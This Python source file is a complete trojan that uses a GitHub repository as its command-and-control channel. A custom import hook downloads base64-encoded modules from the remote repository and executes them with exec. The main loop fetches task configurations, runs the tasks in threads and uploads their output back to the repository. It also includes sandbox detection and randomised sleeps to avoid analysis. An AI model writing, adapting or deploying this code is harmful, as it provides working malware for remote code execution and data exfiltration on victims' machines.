import github3
import importlib
import threading
import base64
import sys
import json
import random
import time
from datetime import datetime
from sandboxdetect import Detector


def connect_github():
    with open('token.txt') as token_file:
        token = token_file.read()

    username = 'VitalijKo'
    session = github3.login(username, token=token)

    return session.repository(username, 'VitGOD')


def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content


class GitImporter:
    def __init__(self):
        self.repo = None
        self.current_module_code = ''

    def find_module(self, name, path=None):
        print(f'[*] Retrieving {name}...')

        self.repo = connect_github()

        new_lib = get_file_contents('modules', f'{name}.py', self.repo)

        if new_lib is not None:
            self.current_module_code = base64.b64decode(new_lib)

            return self

    def load_module(self, name):
        spec = importlib.util.spec_from_loader(
            name,
            loader=None,
            origin=self.repo.git_url
        )

        new_module = importlib.util.module_from_spec(spec)

        exec(self.current_module_code, new_module.__dict__)

        sys.modules[spec.name] = new_module

        return new_module


class Trojan:
    def __init__(self, trojan_id):
        self.trojan_id = trojan_id
        self.config_file = f'{trojan_id}.json'
        self.data_path = f'data/{trojan_id}/'
        self.repo = connect_github()
        self.sandbox_detector = Detector()

    def get_config(self):
        config_json = get_file_contents(
            'config',
            self.config_file,
            self.repo
        )

        config = json.loads(base64.b64decode(config_json))

        for task in config:
            if task['module'] not in sys.modules:
                exec(f'import {task["module"]}')

        return config

    def run_module(self, module, options):
        result = sys.modules[module].run(options)

        self.store_module_result(result)

    def store_module_result(self, data):
        title = datetime.now().isoformat()
        remote_path = f'data/{self.trojan_id}/{title}.json'
        bindata = data.encode('utf-8')

        self.repo.create_file(
            remote_path,
            title,
            base64.b64encode(bindata)
        )

    def run(self):
        while True:
            try:
                self.sandbox_detector.detect()
            except SystemExit:
                time.sleep(random.randint(30 * 60, 3 * 60 * 60))

                continue

            config = self.get_config()

            for task in config:
                if 'module' in task:
                    t = threading.Thread(
                        target=self.run_module,
                        args=(
                            task['module'],
                            task.get('options', {})
                        )
                    )
                    t.start()

                time.sleep(random.randint(1, 10))

            time.sleep(random.randint(30 * 60, 3 * 60 * 60))


if __name__ == '__main__':
    sys.meta_path.append(GitImporter())

    trojan = Trojan('main')
    trojan.run()
